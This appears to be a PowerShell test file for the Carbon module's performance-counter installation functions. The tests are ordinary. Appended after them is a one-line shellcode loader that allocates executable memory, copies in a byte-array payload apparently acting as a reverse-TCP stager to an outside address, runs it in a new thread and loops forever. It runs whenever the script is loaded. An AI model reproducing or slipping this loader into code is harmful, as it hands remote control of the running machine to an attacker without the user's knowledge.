











$CategoryName = 'Carbon-PerformanceCounters'

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Stop-Test
{
    Uninstall-PerformanceCounterCategory -CategoryName $CategoryName
    Assert-False (Test-PerformanceCounterCategory -CategoryName $CategoryName) 'Performance counter category not uninstalled.'
}

function Test-ShouldInstallNewPerformanceCounterWithNewCategory
{
    $name = 'Test Counter'
    $description = 'Counter used to test that Carbon installation function works.'
    $type = 'NumberOfItems32'
    
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Description $description -Type $type
    Assert-True (Test-PerformanceCounterCategory -CategoryName $CategoryName) 'Category not auto-created.'
    Assert-True (Test-PerformanceCounter -CategoryName $CategoryName -Name $name)
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Equal 1 $counters.Length
    Assert-Counter $counters[0] $name $description $type
}

function Test-ShouldInstallCounterWithNoDescription
{
    $name = 'Test Counter'
    $type = 'NumberOfItems32'
    
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Type $type
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Counter $counters[0] $name $null $type
}

function Test-ShouldPreserveExistingCountersWhenInstallingNewCounter
{
    $name = 'Test Counter'
    $description = 'Counter used to test that Carbon installation function works.'
    $type = 'NumberOfItems32'
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Description $description -Type $type
    
    $name2 = 'Test Counter 2'
    $description2 = 'Second counter used to test that Carbon installation function works.'
    $type2 = 'NumberOfItems64'
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name2 -Description $description2 -Type $type2
    
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Equal 2 $counters.Length
    Assert-Counter $counters[0] $name $description $type
    Assert-Counter $counters[1] $name2 $description2 $type2   
}

function Test-ShouldSupportWhatIf
{
    $name = 'Test Counter'
    $description = 'Counter used to test that Carbon installation function works.'
    $type = 'NumberOfItems32'
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Description $description -Type $type -WhatIf
    Assert-False (Test-PerformanceCounterCategory -Categoryname $CategoryName)
    Assert-False (Test-PerformanceCounter -CategoryName $CategoryName -Name $name)    
}

function Test-ShouldReinstallExistingPerformanceCounter
{
    $name = 'Test Counter'
    $description = 'Counter used to test that Carbon installation function works.'
    $type = 'NumberOfItems32'
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Description $description -Type $type
    
    $newDescription = '[New] ' + $description
    $newType = 'NumberOfItems64'
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Description $newDescription -Type $newType
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Counter $counters[0] $name $newDescription $newType
}

function Test-ShouldNotInstallIfCounterHasNotChanged
{
    $name = 'Test Counter'
    $description = 'Counter used to test that Carbon installation function works.'
    $type = 'NumberOfItems32'
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Description $description -Type $type
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Counter $counters[0] $name $description $type
    
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Description $description -Type $type
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Counter $counters[0] $name $description $type
    
    Install-PerformanceCounter -CategoryName $CategoryName -Name $name -Description $description -Type $type -Force
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Counter $counters[0] $name $description $type
}

function Test-ShouldCreateBaseCounter
{
    $name = 'Test Counter'
    $description = 'Counter used to test that Carbon installation function works.'
    $type = 'AverageTimer32'
    
    $baseName = 'Test Base Counter'
    $baseDescription = 'Base counter used by Carbon Test Counter'
    $baseType = 'AverageBase'
    
    Install-PerformanceCounter -Category $CategoryName -Name $name -Description $description -Type $type `
                               -BaseName $baseName -BaseDescription $baseDescription -BaseType $baseType
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Counter $counters[0] $name $description $type
    Assert-Counter $counters[1] $baseName $baseDescription $baseType
}

function Test-ShouldRecreateBaseCounter
{
    $name = 'Test Counter'
    $description = 'Counter used to test that Carbon installation function works.'
    $type = 'AverageTimer32'
    
    $baseName = 'Test Base Counter'
    $baseDescription = 'Base counter used by Carbon Test Counter'
    $baseType = 'AverageBase'
    
    Install-PerformanceCounter -Category $CategoryName -Name $name -Description $description -Type $type `
                               -BaseName $baseName -BaseDescription $baseDescription -BaseType $baseType
    Install-PerformanceCounter -Category $CategoryName -Name 'Third Counter' -Type NumberOfItems32
    
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Counter $counters[0] $name $description $type
    Assert-Counter $counters[1] $baseName $baseDescription $baseType
    Assert-Counter $counters[2] 'Third Counter' $null NumberOfItems32
    
    Install-PerformanceCounter -Category $CategoryName -Name $name -Description $description -Type $type `
                               -BaseName $baseName -BaseDescription $baseDescription -BaseType $baseType `
                               -Force
    $counters = @( Get-PerformanceCounter -CategoryName $CategoryName )
    Assert-Counter $counters[0] 'Third Counter' $null NumberOfItems32
    Assert-Counter $counters[1] $name $description $type
    Assert-Counter $counters[2] $baseName $baseDescription $baseType
    
}

function Assert-Counter($Counter, $Name, $Description, $Type)
{
    Assert-Equal $Name $Counter.CounterName 'counter name'
    if( $Description -eq $null )
    {
        Assert-Equal $Name $Counter.CounterHelp 'counter help'
    }
    else
    {
        Assert-Equal $Description $Counter.CounterHelp 'counter help'
    }
    Assert-Equal $Type $Counter.CounterType 'counter type'

}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x01,0x37,0x0c,0x0d,0x68,0x02,0x00,0x0b,0xc3,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

